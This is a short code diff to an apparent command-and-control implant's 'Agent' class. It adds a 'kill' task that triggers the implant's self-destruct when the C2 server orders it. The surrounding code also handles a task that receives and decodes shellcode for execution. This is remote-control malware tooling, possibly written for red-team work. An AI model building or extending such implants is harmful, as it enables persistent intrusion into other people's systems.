@@ -1655,6 +1655,17 @@ class Agent:
                     "terminal": True  # This flag helps the server identify terminal output
                 }}
             
+            #Kill-pill
+            elif task_type == "kill":
+                self._log_info("[!] Received kill command from C2 - initiating self-destruct")
+                # Use the same self-destruct sequence as killdate
+                self._self_destruct()
+                return {{
+                    "status": "success",
+                    "message": "Self-destruct initiated"
+                }}
+
+
             elif task_type == "shellcode":
                 try:
                     shellcode_b64 = task.get("data", {{}}).get("shellcode", "")
